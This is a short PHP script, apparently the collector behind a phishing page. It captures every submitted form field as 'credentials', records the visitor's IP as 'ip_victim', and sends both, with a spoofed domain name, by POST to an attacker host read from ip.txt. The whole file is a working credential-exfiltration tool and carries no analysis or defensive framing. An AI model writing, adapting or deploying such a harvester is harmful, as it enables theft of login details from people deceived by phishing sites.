<?php

$ipPath = 'ip.txt'; //ip and port 
if (file_exists($ipPath)) {
    $DNS_IP_PORT = file_get_contents($ipPath);
}
$url = "http://$DNS_IP_PORT";
$ip_vicos = $_SERVER['REMOTE_ADDR'];

$namePath = 'domain_name.txt';
if (file_exists($ipPath)) {
    $DOMAIN_NAME = file_get_contents($namePath);
}
else{
    $DOMAIN_NAME = "not specified >:(";
}

if ($_SERVER["REQUEST_METHOD"]==='POST'){
    $keys = $_POST;
    var_dump($keys);
}
if ($_SERVER["REQUEST_METHOD"]==='GET'){
    $keys = $_GET;
    var_dump($keys);    
}

$data = json_encode([
    'domain_name' => $DOMAIN_NAME,
    'credentials' => $keys,
    'ip_victim' => $ip_vicos
]);


// Initialisation de cURL
$ch = curl_init();

// Configuration des options de cURL
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true); // Méthode POST
curl_setopt($ch, CURLOPT_POSTFIELDS, ['data' => $data]); // Données envoyées
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Retourne la réponse en tant que chaîne

// Exécution de la requête
$response = curl_exec($ch);
curl_close($ch);
?>